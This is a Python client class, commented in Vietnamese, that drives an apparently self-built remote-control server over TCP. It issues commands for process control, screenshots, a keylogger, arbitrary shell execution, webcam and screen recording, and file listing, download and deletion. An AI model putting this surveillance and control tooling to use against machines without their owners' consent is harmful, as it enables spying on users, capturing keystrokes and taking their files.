"""
Persistent Socket Client - Quản lý kết nối TCP đến C# Server
Sử dụng Singleton pattern theo session_id
"""

# ==================== IMPORTS ====================

import base64
import json
import socket
import threading
import time


# ==================== MAIN CLASS ====================

class PersistentRemoteClient:
    """
    PersistentRemoteClient - Quản lý kết nối TCP persistent theo session
    """
    
    # ==================== CLASS VARIABLES ====================
    
    _instances = {}
    _class_lock = threading.Lock()  # Class lock để đồng bộ _instances

    # ==================== CONSTRUCTOR ====================

    def __init__(self, host: str, port: int, timeout: int = 5):
        """Khởi tạo client với host, port và timeout."""
        self.host = host
        self.port = port
        self.timeout = timeout
        self.socket: socket.socket | None = None
        self.connected = False
        self.hostname = "Unknown"  # Hostname của server
        self._lock = threading.Lock()  # Instance lock cho thread-safety

    # ==================== CLASS METHODS ====================

    @classmethod
    def get_or_create(cls, session_id, host, port, timeout=5):
        """
        Factory method: Quản lý Singleton theo session_id
        Thread-safe với class lock
        """
        with cls._class_lock:
            if session_id not in cls._instances:
                instance = cls(host, port, timeout)
                try:
                    instance.connect()
                    cls._instances[session_id] = instance
                except Exception:
                    return None
            else:
                instance = cls._instances[session_id]
                if not instance.connected:
                    try:
                        instance.connect()
                    except Exception:
                        del cls._instances[session_id]
                        return None
                        
            return cls._instances[session_id]

    @classmethod
    def disconnect_session(cls, session_id):
        """Ngắt kết nối và xóa session. Thread-safe."""
        with cls._class_lock:
            if session_id in cls._instances:
                client = cls._instances[session_id]
                client.disconnect()
                del cls._instances[session_id]

    # ==================== CONNECTION METHODS ====================

    def connect(self) -> None:
        """Thiết lập kết nối TCP đến server."""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(self.timeout)
            self.socket.connect((self.host, self.port))
            self.connected = True
            self.hostname = "Unknown"  # Reset hostname khi reconnect
        except (socket.timeout, ConnectionRefusedError):
            self.connected = False
            raise  # Ném lỗi ra để hàm gọi xử lý

    def disconnect(self) -> None:
        """Ngắt kết nối và dọn dẹp tài nguyên."""
        if self.socket:
            try:
                self.socket.sendall(b"QUIT\n")
                self.socket.close()
            except:
                pass
        self.socket = None
        self.connected = False

    # ==================== RAW SOCKET HELPERS ====================
    
    def _send_str(self, text: str) -> None:
        """Gửi chuỗi text qua socket, tự động thêm newline."""
        if not text.endswith('\n'):
            text += '\n'
        self.socket.sendall(text.encode('utf-8'))

    def _recv_line(self) -> str:
        """Nhận một dòng text từ socket."""
        line = b''
        while True:
            try:
                char = self.socket.recv(1)
                if not char: break
                if char == b'\n': break
                line += char
            except socket.timeout:
                raise # Ném lỗi timeout lên trên
        return line.decode('utf-8', errors='ignore').strip()

    def _recv_bytes(self, num_bytes: int) -> bytes:
        """Nhận đúng num_bytes từ socket."""
        data = b''
        while len(data) < num_bytes:
            try:
                chunk = self.socket.recv(min(4096, num_bytes - len(data)))
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                raise
        return data

    # ==================== CORE COMMAND METHODS ====================

    def send_command(self, command_type: str, sub_command: str = None, args: str = None) -> dict:
        """Gửi lệnh đến server và nhận phản hồi."""
        if not self.connected:
            return {"status": "error", "message": "Not connected"}
        
        with self._lock:
            try:
                # Gửi loại lệnh chính
                self._send_str(command_type)

                response_data = None
                status = "error"
                msg = ""

                # --- NHÓM LỆNH XỬ LÝ ---
                if command_type == "PROCESS" or command_type == "APPLICATION":
                    if sub_command == "XEM":
                        self._send_str("XEM")
                        count_str = self._recv_line()
                        if count_str.isdigit():
                            count = int(count_str)
                            data_list = []
                            for _ in range(count):
                                data_list.append({
                                    "name": self._recv_line(),
                                    "id": self._recv_line(),
                                    "threads": self._recv_line()
                                })
                            response_data = data_list
                            status = "success"
                    
                    elif sub_command == "KILL":
                        self._send_str("KILL")
                        self._send_str("KILLID")
                        self._send_str(str(args))
                        msg = self._recv_line()
                        status = "success"
                        
                    elif sub_command == "START":
                        self._send_str("START")
                        self._send_str("STARTID")
                        app_name = str(args)
                        # Mapping tên tắt
                        aliases = {
                            "edge": "msedge",
                            "chrome": "chrome",
                            "notepad": "notepad",
                            "calc": "calc"
                        }
                        if app_name.lower() in aliases:
                            app_name = aliases[app_name.lower()]
                        self._send_str(app_name)
                        msg = self._recv_line()
                        status = "success"
                    
                    self._send_str("QUIT")

                elif command_type == "TAKEPIC":
                    self._send_str("TAKE")
                    size_str = self._recv_line()
                    if size_str.isdigit():
                        size = int(size_str)
                        if size > 0:
                            img_data = self._recv_bytes(size)
                            response_data = base64.b64encode(img_data).decode('utf-8')
                            status = "success"
                    self._send_str("QUIT")

                elif command_type == "KEYLOG":
                    if sub_command == "PRINT":
                        self._send_str("PRINT")
                        response_data = self._recv_line()
                        status = "success"
                    elif sub_command == "HOOK":
                        self._send_str("HOOK")
                        status = "success"
                        msg = "Keylogger started"
                    elif sub_command == "UNHOOK":
                        self._send_str("UNHOOK")
                        status = "success"
                        msg = "Keylogger stopped"
                    elif sub_command == "CLEAR":
                        self._send_str("CLEAR")
                        msg = self._recv_line()
                        status = "success"
                    elif sub_command == "STATUS":
                        self._send_str("STATUS")
                        response_data = self._recv_line()
                        status = "success"
                    self._send_str("QUIT")

                elif command_type == "CMD":
                    if sub_command == "EXEC":
                        self._send_str("EXEC")
                        self._send_str(str(args))
                        size_str = self._recv_line()
                        if size_str.isdigit():
                            size = int(size_str)
                            if size > 0:
                                output_bytes = self._recv_bytes(size)
                                response_data = output_bytes.decode('utf-8', errors='replace')
                            else:
                                response_data = "" 
                            status = "success"
                        else:
                            response_data = "Protocol Error"
                            status = "error"
                    self._send_str("QUIT")

                elif command_type in ["SHUTDOWN", "RESTART"]:
                    status = "success"
                    self._send_str("QUIT")

                return {"status": status, "data": response_data, "message": msg}
            
            except socket.timeout:
                self.connected = False
                return {"status": "error", "message": "Request Timed Out (Server likely BUSY or Blocked)"}
                
            except Exception as e:
                self.connected = False
                return {"status": "error", "message": str(e)}

    # ==================== WEBCAM & SCREEN METHODS ====================
    
    def _generic_recorder_action(self, module_name: str, action: str, is_stop: bool = False) -> dict:
        """Xử lý chung cho các thao tác webcam/screen recording."""
        if not self.connected:
            return {"success": False, "message": "Not connected"}
        
        with self._lock:
            try:
                self._send_str(module_name)
                self._send_str(action)
                
                if not is_stop:
                    response = self._recv_line()
                    self._send_str("QUIT")
                    return {"success": True, "message": response}
                
                # Stop Recording Logic
                response = self._recv_line()
                if "STOPPED" not in response:
                    self._send_str("QUIT")
                    return {"success": False, "message": response}
                
                parts = response.split('|')
                filename = parts[1] if len(parts) > 1 else "video.avi"
                duration = int(parts[3]) if len(parts) > 3 and parts[3].isdigit() else 0
                
                size_check = self._recv_line()
                if not size_check.isdigit():
                    self._send_str("QUIT")
                    return {"success": False, "message": "Protocol Error"}
                
                real_size = int(size_check)
                video_data = self._recv_bytes(real_size) if real_size > 0 else b''
                
                self._send_str("QUIT")
                return {"success": True, "message": "Saved", "filename": filename, 
                        "file_size": real_size, "video_data": video_data, "duration": duration}

            except socket.timeout:
                self.connected = False
                return {"success": False, "message": "Timeout: Server likely BUSY"}
            except Exception as e:
                return {"success": False, "message": str(e)}

    # Webcam wrapper methods
    def webcam_on(self): return self._generic_recorder_action("WEBCAM", "ON")
    def webcam_off(self): return self._generic_recorder_action("WEBCAM", "OFF")
    def webcam_start_recording(self): return self._generic_recorder_action("WEBCAM", "START_REC")
    def webcam_stop_recording(self): return self._generic_recorder_action("WEBCAM", "STOP_REC", is_stop=True)
    def webcam_get_frame(self): return self._get_frame_generic("WEBCAM")
    def webcam_status(self): return self._get_status_generic("WEBCAM")
    
    # Screen wrapper methods
    def screen_start_stream(self): return self._generic_recorder_action("SCREEN_REC", "START")
    def screen_stop_stream(self): return self._generic_recorder_action("SCREEN_REC", "STOP")
    def screen_start_recording(self): return self._generic_recorder_action("SCREEN_REC", "START_REC")
    def screen_stop_recording(self): return self._generic_recorder_action("SCREEN_REC", "STOP_REC", is_stop=True)
    def screen_get_frame(self): return self._get_frame_generic("SCREEN_REC")
    def screen_status(self): return self._get_status_generic("SCREEN_REC")

    def _get_frame_generic(self, module: str) -> bytes | None:
        """Lấy frame hiện tại từ module (WEBCAM hoặc SCREEN_REC)."""
        if not self.connected:
            return None
        # Sử dụng non-blocking lock acquire để tránh deadlock khi streaming
        if not self._lock.acquire(blocking=False):
            return None
        try:
            # Đặt timeout ngắn cho frame streaming
            old_timeout = self.socket.gettimeout()
            self.socket.settimeout(0.5)
            try:
                self._send_str(module)
                self._send_str("GET_FRAME")
                size_str = self._recv_line()
                if not size_str.isdigit() or int(size_str) == 0:
                    self._send_str("QUIT")
                    return None
                frame_data = self._recv_bytes(int(size_str))
                self._send_str("QUIT")
                return frame_data
            finally:
                self.socket.settimeout(old_timeout)
        except:
            return None
        finally:
            self._lock.release()

    def _get_status_generic(self, module: str) -> dict:
        """Lấy trạng thái của module (on/rec)."""
        if not self.connected:
            return {"on": False, "rec": False}
        with self._lock:
            try:
                self._send_str(module)
                self._send_str("STATUS")
                resp = self._recv_line()
                self._send_str("QUIT")
                parts = resp.split('|')
                is_on = "true" in parts[0]
                is_rec = "true" in parts[1] if len(parts) > 1 else False
                return {"on": is_on, "rec": is_rec}
            except:
                return {"on": False, "rec": False}

    # ==================== SHELL METHODS ====================

    def shell_reset(self) -> None:
        """Reset shell session trên server."""
        if not self.connected:
            return
        with self._lock:
            try:
                self._send_str("CMD")
                self._send_str("RESET")
            except:
                pass

    # ==================== FILE MANAGER METHODS ====================

    def _file_operation(self, *commands) -> tuple[bool, str]:
        """Helper: Gửi các commands FILE và return (success, first_response)."""
        try:
            for cmd in commands:
                self._send_str(cmd)
            return True, self._recv_line()
        except socket.timeout:
            return False, "Timeout: Server likely BUSY"
        except Exception as e:
            return False, str(e)

    def file_get_drives(self) -> dict:
        """Lấy danh sách ổ đĩa từ server."""
        if not self.connected:
            return {"success": False, "message": "Not connected"}
        with self._lock:
            try:
                self._send_str("FILE")
                self._send_str("GET_DRIVES")
                count = int(self._recv_line())
                drives = [
                    {"path": p[0], "type": p[1], "info": p[2]}
                    for _ in range(count)
                    for p in [self._recv_line().split('|')]
                    if len(p) >= 3
                ]
                self._send_str("QUIT")
                return {"success": True, "drives": drives}
            except socket.timeout:
                return {"success": False, "message": "Timeout: Server likely BUSY"}
            except Exception as e:
                return {"success": False, "message": str(e)}

    def file_get_directory(self, path: str) -> dict:
        """Lấy nội dung thư mục từ server."""
        if not self.connected:
            return {"success": False, "message": "Not connected"}
        with self._lock:
            try:
                self._send_str("FILE")
                self._send_str("GET_DIR")
                self._send_str(path)
                resp = self._recv_line()
                if resp == "ERROR":
                    msg = self._recv_line()
                    self._send_str("QUIT")
                    return {"success": False, "message": msg}
                
                items = [
                    {"type": p[0], "name": p[1], "size": p[2]}
                    for _ in range(int(resp)) if resp.isdigit()
                    for p in [self._recv_line().split('|')]
                    if len(p) >= 3
                ] if resp.isdigit() else []
                
                self._send_str("QUIT")
                return {"success": True, "items": items, "current_path": path}
            except socket.timeout:
                return {"success": False, "message": "Timeout: Server likely BUSY"}
            except Exception as e:
                return {"success": False, "message": str(e)}

    def file_delete_item(self, path: str) -> dict:
        """Xóa file hoặc thư mục trên server."""
        if not self.connected:
            return {"success": False, "message": "Not connected"}
        with self._lock:
            try:
                self._send_str("FILE")
                self._send_str("DELETE")
                self._send_str(path)
                status = self._recv_line()
                msg = self._recv_line()
                self._send_str("QUIT")
                return {"success": (status == "SUCCESS"), "message": msg}
            except socket.timeout:
                return {"success": False, "message": "Timeout: Server likely BUSY"}
            except Exception as e:
                return {"success": False, "message": str(e)}

    def file_download(self, path: str) -> dict:
        """Tải file từ server về client."""
        if not self.connected:
            return {"success": False, "message": "Not connected"}
        with self._lock:
            try:
                self._send_str("FILE")
                self._send_str("DOWNLOAD")
                self._send_str(path)
                size_str = self._recv_line()
                if not size_str.isdigit() or int(size_str) == 0:
                    self._send_str("QUIT")
                    return {"success": False, "message": "File invalid"}
                data = self._recv_bytes(int(size_str))
                self._send_str("QUIT")
                filename = path.split('\\')[-1]
                return {"success": True, "filename": filename, "data": data}
            except socket.timeout:
                return {"success": False, "message": "Timeout: Server likely BUSY"}
            except Exception as e:
                return {"success": False, "message": str(e)}

    # ==================== SYSTEM INFO METHODS ====================

    def get_system_stats(self) -> dict:
        """Lấy thông tin hệ thống từ server (CPU, RAM, Battery, etc.)."""
        if not self.connected:
            return {"status": "error", "message": "Not connected"}
        with self._lock:
            try:
                self.socket.settimeout(2.0)
                start = time.time()
                self._send_str("SYSTEM_INFO")
                response = self._recv_line()
                latency = round((time.time() - start) * 1000, 0)
                self.socket.settimeout(self.timeout)

                if response.startswith("ERROR"):
                    return {"status": "error", "message": response}
                
                parts = response.split('|')
                keys = ["cpu_load", "ram_free", "battery", "uptime", "hostname", 
                        "os_info", "internal_ip", "cpu_name", "gpu_name", "ram_total", 
                        "disk_info", "screen_res"]
                defaults = ["0", "0", "Unk", "0d", "Unk", "Unk", "Unk", "CPU", "GPU", "?", "Drive", "Res"]
                
                data = {k: (parts[i] if i < len(parts) else d) for i, (k, d) in enumerate(zip(keys, defaults))}
                data["latency"] = latency
                self.hostname = data["hostname"]
                
                return {"status": "success", "data": data}

            except socket.timeout:
                return {"status": "error", "message": "Timeout (Server Busy/Lag)"}
            except Exception as e:
                self.connected = False
                return {"status": "error", "message": str(e)}